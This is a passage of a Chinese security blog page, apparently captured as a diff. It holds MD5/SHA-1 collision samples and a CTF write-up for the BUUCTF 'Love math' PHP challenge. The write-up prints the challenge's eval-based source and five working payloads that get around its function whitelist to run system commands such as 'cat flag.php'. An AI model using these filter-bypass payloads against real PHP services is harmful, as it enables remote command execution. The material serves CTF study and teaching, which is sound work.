class="line">a=&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x00\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\x55\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;;</span><br><span class="line">b=&quot;\x4d\xc9\x68\xff\x0e\xe3\x5c\x20\x95\x72\xd4\x77\x7b\x72\x15\x87\xd3\x6f\xa7\xb2\x1b\xdc\x56\xb7\x4a\x3d\xc0\x78\x3e\x7b\x95\x18\xaf\xbf\xa2\x02\xa8\x28\x4b\xf3\x6e\x8e\x4b\x55\xb3\x5f\x42\x75\x93\xd8\x49\x67\x6d\xa0\xd1\xd5\x5d\x83\x60\xfb\x5f\x07\xfe\xa2&quot;;</span><br></pre></td></tr></table></figure>
+
+<p><strong>linux</strong></p>
+<p>使用md5collgen碰撞生成两个md5值相同但内容不同的文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5collgen -o 1.bin 2.bin</span><br></pre></td></tr></table></figure>
+
+<p><strong>windows</strong></p>
+<p>可以下载fastcoll，碰撞生成两个md5值相同但内容不同的文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastcoll.exe -p 123.txt -o 1.txt 2.txt</span><br></pre></td></tr></table></figure>
+
+<p><strong>sha1 碰撞</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1</span><br><span class="line">b=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</span><br></pre></td></tr></table></figure>
+
+<h3 id=""><a href="#" class="headerlink" title=""></a></h3>
+	
+	</div>
+  <a type="button" href="/2023/06/20/Php/Hash/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2023/03/02/Writeup/Love math/" >Love math</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2023-03-02  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<h1 id="Love-math"><a href="#Love-math" class="headerlink" title="Love math"></a>Love math</h1><p>BUUCTF 有趣的数学题，0.0</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: 收集自网络</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-06 14:04:45</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>函数解释：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match_all ( string $pattern , string $subject [, array &amp;$matches [, int $flags = PREG_PATTERN_ORDER [, int $offset = 0 ]]] ) : int</span><br></pre></td></tr></table></figure>
+
+<p>搜索<code>subject</code>中所有匹配<code>pattern</code>给定正则表达式 的匹配结果并且将它们以<code>flag</code>指定顺序输出到<code>matches</code>中.结果排序为<code>$matches[0]</code>保存完整模式的所有匹配, <code>$matches[1]</code> 保存第一个子组的所有匹配，以此类推。</p>
+<p>这段代码的意思是：首先接收一个<code>c</code>, 长度还不能大于 80 。还不能有黑名单中的 空格、<code>\t</code>、<code>\r</code>、<code>\n</code>、引号、方括号。然后设置白名单，必须符合。也就是必须输入白名单中的函数。最后用<code>eval()</code>来执行并返回我们的参数。</p>
+<p><strong>做题思路：</strong></p>
+<p>首先 php 允许把函数名通过字符串方式传递给一个变量，然后通过变量动态调用函数。如<code>$a=&quot;abc&quot;;$A()</code>就会执行 abc() 函数。</p>
+<p>php 中函数名默认为字符串，可以进行异或。</p>
+<h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>想办法构造<code>$_GET[1]</code>再传参getflag，但是其实发现构造这个很难。。。因为<code>$</code>、<code>_</code>、<code>[</code>、<code>]</code>都不能用，同时<code>GET</code>必须是大写，很难直接构造。</p>
+<p>先看一下用到的一些数学函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base_convert ( string $number , int $frombase , int $tobase ) : string </span><br></pre></td></tr></table></figure>
+
+<p>返回一字符串，包含 <code>number</code> 以 <code>tobase</code> 进制的表示。<code>number</code> 本身的进制由 <code>frombase</code> 指定。<code>frombase</code> 和 <code>tobase</code> 都只能在 2 和 36 之间（包括 2 和 36）。高于十进制的数字用字母 a-z 表示，例如 a 表示 10，b 表示 11 以及 z 表示 35。意思就是将输入数字的进制进行转换。</p>
+<p>可以使用这个函数将其他进制数转为36进制，而是36进制是包含所有数字和小写字母的。但终究无法构造<code>GET</code>大写字母。但又可以构造其他的小写字母函数，让构造的函数转换。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hexdec ( string $hex_string ) : number    //十六进制转换为十进制</span><br><span class="line">dechex ( int $number ) : string        //十进制转换为十六进制</span><br><span class="line">bin2hex ( string $str ) : string    //函数把包含数据的二进制字符串转换为十六进制值</span><br><span class="line">hex2bin ( string $data ) : string    //转换十六进制字符串为二进制字符串    </span><br></pre></td></tr></table></figure>
+
+<p>那么我们就可以想象一下，把<code>_GET</code>先利用<code>bin2hex()</code>转换为 十六进制，在利用<code>hexdec()</code>转换为十进制，那么反过来就可以把一段数字转换为字符。</p>
+<p>但是<code>binhex()</code>， <code>hexdec()</code>等不是白名单的函数，要从哪里来？</p>
+<p>这时候就要看<code>base_convert()</code>的作用了，因为上面的函数都是小写的，所以可以利用此函数将一个十进制数的数字转为三十六进制的小写字符。这里三十六进制是10个数字+26个小写字母，因此能够完整表示出一个函数名的所有字符。</p>
+<p>那么怎么才能直到这个数呢？我们可以先逆向将三十六进制字符转换为十进制数，得到该数字，最终逆向构造即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">base_convert(&#x27;hex2bin&#x27;,36,10);        //37907361743</span><br><span class="line">base_convert(37907361743,10,36);    //hex2bin</span><br></pre></td></tr></table></figure>
+
+<p>再将<code>_GET</code>反向构造出来：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bin2hex(&#x27;_GET&#x27;);    //得到 5f474554 将字符转换为十六进制</span><br><span class="line">hexdec(&#x27;5f474554&#x27;);    //得到 1598506324 将十六进制转为十进制</span><br><span class="line"> </span><br><span class="line">dechex(1598506324);        //得到 5f474554 将十进制转换为十六进制</span><br><span class="line">hex2bin(&#x27;5f474554&#x27;);    //得到 _GET</span><br></pre></td></tr></table></figure>
+
+<p>白名单中有<code>dechex()</code>、<code>hexdec()</code>函数，但是没有<code>hex2bin()</code>、<code>bin2hex()</code>函数，但是我们可以使用<code>base_convert()</code>函数构造任意小写函数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base_convert(37907361743,10,36)(dechex(1598506324))        //hex2bin(dechex(1598506324))</span><br></pre></td></tr></table></figure>
+
+<p>可以用<code>&#123;&#125;</code>代替<code>[]</code>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi&#123;abs&#125;)($$pi&#123;acos&#125;)&amp;abs=system&amp;acos=ls</span><br><span class="line">// $pi=_GET;($_GET[abs])($_GET[acos])    ==&gt; $pi=_GET;(system)(ls)</span><br><span class="line">//得到 _GETflag.php index.php</span><br><span class="line"> </span><br><span class="line">?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi&#123;abs&#125;)($$pi&#123;acos&#125;)&amp;abs=system&amp;acos=cat flag.php</span><br><span class="line">//得到flag</span><br></pre></td></tr></table></figure>
+
+<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>可以构造<code>getallheaders()</code>传参，此是小写的，可以直接用<code>base_convert</code>转换。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getallheaders ( void ) : array</span><br></pre></td></tr></table></figure>
+
+<p>获取全部 HTTP 请求头信息。</p>
+<p>首先构造<code>system</code>和<code>getallheaders</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">base_convert(&#x27;getallheaders&#x27;,30,10);</span><br><span class="line">//得到8768397090111664438，这里不使用36进制是因为精度会丢失，尝试到30的时候成功</span><br><span class="line"> </span><br><span class="line">base_convert(&#x27;system&#x27;,36,10);    //得到1751504350</span><br></pre></td></tr></table></figure>
+
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=$pi=base_convert;$pi(1751504350,10,36)($pi(8768397090111664438,10,30)()&#123;1&#125;)</span><br><span class="line">HEADER:    1:cat flag.php</span><br></pre></td></tr></table></figure>
+
+<h2 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h2><p>直接<code>cat f*</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo dechex(16)^asinh^pi;        //输出*</span><br><span class="line">base_convert(&#x27;cat&#x27;,36,10);        //得到15941</span><br><span class="line">base_convert(&#x27;system&#x27;,36,10);        //得到1751504350</span><br></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(16)^asinh^pi))</span><br><span class="line"> </span><br><span class="line">//system(&#x27;cat&#x27;.dechex(16)^asinh^pi) =&gt; system(&#x27;cat *&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexdec(bin2hex(&#x27;cat f*&#x27;));        //得到109270211257898</span><br><span class="line">base_convert(&#x27;exec&#x27;,36,10);        //得到696468</span><br></pre></td></tr></table></figure>
+
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=($pi=base_convert)(696468,10,36)($pi(76478043844,9,34)(dechex(109270211257898)))</span><br><span class="line"> </span><br><span class="line">//exec(&#x27;hex2bin(dechex(109270211257898))&#x27;) =&gt; exec(&#x27;cat f*&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>这里发现一个问题，这个payload超过了80的长度限制，所以只能把三十四进制转换为二十三进制。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=($pi=base_convert)(22950,23,34)($pi(76478043844,9,34)(dechex(109270211257898)))</span><br></pre></td></tr></table></figure>
+
+<h2 id="方法四"><a href="#方法四" class="headerlink" title="方法四"></a>方法四</h2><p>前面都是利用白名单的数学函数将数字转成字符串，其实也可以异或构造这是fuzz脚本</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$payload</span>=[<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>,  <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$k</span>=<span class="number">1</span>;<span class="variable">$k</span>&lt;=<span class="title function_ invoke__">sizeof</span>(<span class="variable">$payload</span>);<span class="variable">$k</span>++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">9</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;<span class="variable">$j</span>&lt;=<span class="number">9</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line">            <span class="variable">$exp</span>=<span class="variable">$payload</span>[<span class="variable">$k</span>] ^<span class="variable">$i</span>.<span class="variable">$j</span>;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="variable">$payload</span>[<span class="variable">$k</span>].<span class="string">&quot;^<span class="subst">$i</span><span class="subst">$j</span>&quot;</span>.<span class="string">&quot;==&gt;<span class="subst">$exp</span>&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span><span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>得到<code>is_nan^64==&gt;_G</code>和<code>tan^15==&gt;ET</code></p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=$pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi&#123;0&#125;($pi&#123;1&#125;)&amp;0=system&amp;1=cat flag.php</span><br><span class="line"> </span><br><span class="line">//$pi=_GET;$pi=$_GET;$_GET[0]($_GET[1])&amp;0=system&amp;1=cat flag.php  ==&gt;  system(cat flag.php)</span><br></pre></td></tr></table></figure>
+
+<h2 id="方法五"><a href="#方法五" class="headerlink" title="方法五"></a>方法五</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">string_to_base36</span>(<span class="params">s</span>):</span><br><span class="line">    base = <span class="number">36</span></span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> s:</span><br><span class="line">        num = num * base + (<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>)) <span class="keyword">if</span> char.isdigit() <span class="keyword">else</span> num * base + (<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) + <span class="number">10</span>)</span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(string_to_base36(<span class="string">&#x27;ls&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<p>Python 字符串转36进制，然后用 base_convert 10进制转36进制</p>
+<blockquote>
+<p>base_convert(<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.types.string.php">string</a> <code>$num</code>, <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.types.integer.php">int</a> <code>$from_base</code>, <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.types.integer.php">int</a> <code>$to_base</code>): string</p>
+<p>num</p>
+<p>要转换的数字。<code>num</code> 中的任何无效字符都会默认忽略。自 PHP 7.4.0 起，弃用使用任何无效字符。</p>
+<p>from_base</p>
+<p><code>num</code> 的进制数</p>
+<p>to_base</p>
+<p><code>num</code> 要转换为的进制数</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?base_convert(1751504350,10,36)(base_convert(784,10,36))</span><br><span class="line">// system(ls)</span><br></pre></td></tr></table></figure>
+
+
+	
+	</div>
+  <a type="button" href="/2023/03/02/Writeup/Love math/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+
+		</div>
+
+		<!-- pagination -->
+		<div>
+  		<center>
+		<div class="pagination">
+
+   
+    
+     <a href="/page/20/" type="button" class="btn btn-default"><i class="fa fa-arrow-circle-o-left"></i> Prev</a>
+      
+
+        <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+ 
+          <a type="button" class="btn btn-default disabled">Next<i class="fa fa-arrow-circle-o-right"></i></a>
+        
+
+  
+</div>
+
+  		</center>
+		</div>
+
+		
+		
+	</div> <!-- col-md-9 -->
+
+	
+		<div class="col-md-3">
+	<div id="sidebar">
+	
+			
+  <div id="site_search">
+   <div class="form-group">
+    <input type="text" id="local-search-input" name="q" results="0" placeholder="Search" class="st-search-input st-default-search-input form-control"/>
+   </div>  
+  <div id="local-search-result"></div>
+  </div>
+
+
+		
+			
+	<div class="widget">
+		<h4>Categories</h4>
+		<ul class="tag_box inline list-unstyled">
+		
+			<li><a href="/categories/Java/">Java<span>12</span></a></li>
+		
+			<li><a href="/categories/Linux/">Linux<span>1</span></a></li>
+		
+			<li><a href="/categories/Mysql/">Mysql<span>2</span></a></li>
+		
+			<li><a href="/categories/Network/">Network<span>1</span></a></li>
+		
+			<li><a href="/categories/Pentest/">Pentest<span>10</span></a></li>
+		
+			<li><a href="/categories/Php/">Php<span>4</span></a></li>
+		
+			<li><a href="/categories/Pollution/">Pollution<span>2</span></a></li>
+		
+			<li><a href="/categories/SSRF/">SSRF<span>1</span></a></li>
+		
+			<li><a href="/categories/Tool/">Tool<span>1</span></a></li>
+		
+			<li><a href="/categories/Vuln/">Vuln<span>3</span></a></li>
+		
+			<li><a href="/categories/Writeup/">Writeup<span>5</span></a></li>
+		
+		</ul>
+	</div>
+
+		
+			
+	<div class="widget">
+		<h4>Tag Cloud</h4>
+		<ul class="tag_box inline list-unstyled">		
+		
+			<li><a href="/tags/Python/">Python<span>1</span></a></li>
+		
+			<li><a href="/tags/Deserialize/">Deserialize<span>7</span></a></li>
+		
+			<li><a href="/tags/Protocol/">Protocol<span>1</span></a></li>
+		
